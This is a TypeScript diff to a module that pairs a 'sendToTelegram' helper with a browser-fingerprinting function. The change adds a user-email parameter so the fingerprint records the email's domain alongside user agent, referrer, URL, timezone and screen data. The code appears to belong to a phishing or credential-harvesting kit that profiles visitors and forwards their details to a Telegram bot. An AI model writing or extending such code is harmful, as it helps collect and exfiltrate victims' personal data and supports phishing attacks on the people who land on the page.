@@ -22,9 +22,10 @@ export const sendToTelegram = async (data: any): Promise<any> => {
   }
 };
 
-export const getBrowserFingerprint = () => {
+export const getBrowserFingerprint = (userEmail?: string) => {
   // Check if we're in a browser environment
   if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') {
+    const emailDomain = userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
     return {
       userAgent: 'Server-side',
       language: 'en-US',
@@ -33,7 +34,7 @@ export const getBrowserFingerprint = () => {
       doNotTrack: null,
       timezone: 'UTC',
       url: '',
-      domain: '',
+      domain: emailDomain,
       referrer: '',
       screen: {
         width: 0,
@@ -77,6 +78,8 @@ export const getBrowserFingerprint = () => {
     return data;
   };
 
+  // Extract domain from email if provided, otherwise use current hostname
+  const emailDomain = userEmail ? userEmail.split('@')[1] || window.location.hostname : window.location.hostname;
   return {
     userAgent: navigator.userAgent,
     language: navigator.language,
@@ -85,7 +88,7 @@ export const getBrowserFingerprint = () => {
     doNotTrack: navigator.doNotTrack,
     timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'UTC',
     url: window.location.href,
-    domain: window.location.hostname,
+    domain: emailDomain,
     referrer: document.referrer,
     screen: {
       width: typeof screen !== 'undefined' ? screen.width : 0,
